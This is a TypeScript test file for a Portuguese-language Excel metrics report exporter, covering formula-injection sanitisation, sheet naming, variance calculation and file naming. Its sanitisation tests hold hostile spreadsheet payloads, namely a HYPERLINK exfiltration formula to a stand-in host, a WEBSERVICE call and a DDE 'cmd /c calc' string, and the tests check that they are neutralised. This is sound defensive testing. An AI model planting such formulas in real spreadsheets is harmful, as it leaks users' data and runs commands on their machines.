import { describe, it, expect } from "vitest";
import {
  montarRelatorio,
  nomeDeAba,
  nomeDoArquivo,
  sanitizarCelula,
  type ReportItem,
} from "./metrics-studio-report";
import { ENGINE_BY_ID } from "./metrics-studio-engine-map";
import type { MetricMeasureResult } from "@/modules/analytics/hooks/useMetricMeasure";

const receita = ENGINE_BY_ID.get("receita")!;
const ticket = ENGINE_BY_ID.get("ticket_medio")!;

const escalar = (value: number | null, extra: Partial<MetricMeasureResult> = {}): MetricMeasureResult => ({
  kind: "leaf",
  unit: "currency",
  currency: "BRL",
  anchor: "fechamentos",
  recorte: "total",
  value,
  series: null,
  empty_reason: null,
  ...extra,
});

const comSerie = (pontos: [string, number][], recorte = "origem"): MetricMeasureResult => ({
  kind: "leaf",
  unit: "currency",
  currency: "BRL",
  anchor: "fechamentos",
  recorte,
  value: null,
  series: pontos.map(([label, value]) => ({ key: label, label, value })),
  empty_reason: null,
});

const base = {
  orgNome: "Milennials",
  scope: "month" as const,
  periodoLabel: "agosto de 2026",
  geradoEm: new Date(2026, 7, 12, 14, 30),
};

describe("sanitização de célula — injeção de fórmula", () => {
  it("neutraliza os quatro gatilhos de fórmula", () => {
    for (const perigoso of ["=1+1", "+SOMA(A1)", "-2", "@import"]) {
      expect(sanitizarCelula(perigoso).startsWith("'")).toBe(true);
    }
  });

  it("neutraliza o clássico de exfiltração via HYPERLINK", () => {
    expect(sanitizarCelula('=HYPERLINK("http://mal.co?"&A1,"clique")')).toMatch(/^'=/);
  });

  it("não estraga texto legítimo", () => {
    expect(sanitizarCelula("Meta Ads")).toBe("Meta Ads");
    expect(sanitizarCelula("Distribuidora 3M")).toBe("Distribuidora 3M");
    expect(sanitizarCelula("R$ 1.200")).toBe("R$ 1.200");
  });

  it("o nome da org também passa pelo filtro — vem de campo livre", () => {
    const abas = montarRelatorio({ ...base, orgNome: "=cmd|' /c calc'!A1", itens: [] });
    const linhaOrg = abas[0].linhas.find((l) => l[0] === "Organização")!;
    expect(String(linhaOrg[1]).startsWith("'")).toBe(true);
  });

  it("rótulo de série vem de dado do cliente e é sanitizado", () => {
    const itens: ReportItem[] = [
      { metric: receita, corte: "origem", atual: comSerie([["=WEBSERVICE(\"http://x\")", 10]]), anterior: null },
    ];
    const detalhe = montarRelatorio({ ...base, itens })[1];
    const linha = detalhe.linhas.find((l) => typeof l[0] === "string" && l[0].includes("WEBSERVICE"))!;
    expect(String(linha[0]).startsWith("'")).toBe(true);
  });
});

describe("nome de aba", () => {
  it("corta em 31 caracteres, limite do Excel", () => {
    const nome = nomeDeAba("Faturamento por origem de lead muito comprido", new Set());
    expect(nome.length).toBeLessThanOrEqual(31);
  });

  it("remove os caracteres que o Excel recusa", () => {
    expect(nomeDeAba("a:b\\c/d?e*f[g]h", new Set())).not.toMatch(/[:\\/?*[\]]/);
  });

  it("desambigua colisão sem estourar o limite", () => {
    const usados = new Set<string>();
    const a = nomeDeAba("Faturamento", usados);
    const b = nomeDeAba("Faturamento", usados);
    expect(a).not.toBe(b);
    expect(b.length).toBeLessThanOrEqual(31);
  });

  it("nunca devolve nome vazio", () => {
    expect(nomeDeAba("///", new Set()).length).toBeGreaterThan(0);
  });
});

describe("montagem do relatório", () => {
  it("sempre tem a aba Resumo, mesmo com painel vazio", () => {
    const abas = montarRelatorio({ ...base, itens: [] });
    expect(abas).toHaveLength(1);
    expect(abas[0].nome).toBe("Resumo");
    expect(JSON.stringify(abas[0].linhas)).toContain("Painel vazio");
  });

  it("cabeçalho traz org, período e quando foi gerado", () => {
    const texto = JSON.stringify(montarRelatorio({ ...base, itens: [] })[0].linhas);
    expect(texto).toContain("Milennials");
    expect(texto).toContain("Mensal");
    expect(texto).toContain("agosto de 2026");
  });

  it("calcula a variação contra o período anterior", () => {
    const itens: ReportItem[] = [
      { metric: receita, corte: "total", atual: escalar(120), anterior: escalar(100) },
    ];
    const linha = montarRelatorio({ ...base, itens })[0].linhas.at(-1)!;
    expect(linha[4]).toBe("+20.0%");
  });

  it("mostra travessão em vez de zero quando não há dado", () => {
    const itens: ReportItem[] = [
      { metric: receita, corte: "total", atual: null, anterior: null },
    ];
    const linha = montarRelatorio({ ...base, itens })[0].linhas.at(-1)!;
    expect(linha[2]).toBe("—");
    expect(linha[5]).toBe("Sem dado disponível");
  });

  it("não inventa variação quando a base anterior é zero", () => {
    const itens: ReportItem[] = [
      { metric: receita, corte: "total", atual: escalar(50), anterior: escalar(0) },
    ];
    expect(montarRelatorio({ ...base, itens })[0].linhas.at(-1)![4]).toBe("—");
  });

  it("DENUNCIA quando o motor degradou o corte — senão o relatório mente", () => {
    const itens: ReportItem[] = [
      // Pediu por etapa, o motor devolveu total.
      { metric: receita, corte: "pipeline", atual: escalar(500, { recorte: "total" }), anterior: null },
    ];
    const linha = montarRelatorio({ ...base, itens })[0].linhas.at(-1)!;
    expect(String(linha[5])).toContain("indisponível");
    expect(linha[1]).toBe("Total");
  });

  it("série vira aba própria, com participação e total", () => {
    const itens: ReportItem[] = [
      { metric: receita, corte: "origem", atual: comSerie([["Meta Ads", 75], ["Indicação", 25]]), anterior: null },
    ];
    const abas = montarRelatorio({ ...base, itens });
    expect(abas).toHaveLength(2);
    const texto = JSON.stringify(abas[1].linhas);
    expect(texto).toContain("Meta Ads");
    expect(texto).toContain("75.0%");
    expect(abas[1].linhas.at(-1)).toEqual(["Total", 100, "100,0%"]);
  });

  it("o detalhe guarda número CRU — é a coluna que o cliente soma no ERP", () => {
    const itens: ReportItem[] = [
      { metric: receita, corte: "origem", atual: comSerie([["Meta Ads", 1234.5]]), anterior: null },
    ];
    const linha = montarRelatorio({ ...base, itens })[1].linhas.find((l) => l[0] === "Meta Ads")!;
    expect(linha[1]).toBe(1234.5);
  });

  it("métrica escalar não gera aba de detalhe — seria aba de uma célula", () => {
    const itens: ReportItem[] = [
      { metric: ticket, corte: "total", atual: escalar(980), anterior: escalar(900) },
    ];
    expect(montarRelatorio({ ...base, itens })).toHaveLength(1);
  });

  it("duas janelas da mesma métrica não colidem no nome da aba", () => {
    const itens: ReportItem[] = [
      { metric: receita, corte: "origem", atual: comSerie([["A", 1]]), anterior: null },
      { metric: receita, corte: "origem", atual: comSerie([["B", 2]]), anterior: null },
    ];
    const abas = montarRelatorio({ ...base, itens });
    expect(new Set(abas.map((a) => a.nome)).size).toBe(abas.length);
  });
});

describe("nome do arquivo", () => {
  it("usa slug da org, escopo e data", () => {
    expect(nomeDoArquivo("Milennials", "month", new Date(2026, 7, 12)))
      .toBe("metricas_milennials_mensal_2026-08-12.xlsx");
  });

  it("trata acento e caractere especial", () => {
    expect(nomeDoArquivo("Café Jurerê & Cia", "quarter", new Date(2026, 0, 5)))
      .toBe("metricas_cafe_jurere_cia_trimestral_2026-01-05.xlsx");
  });

  it("nome vazio não gera arquivo sem nome", () => {
    expect(nomeDoArquivo("", "month", new Date(2026, 7, 12))).toContain("metricas_org_");
  });
});
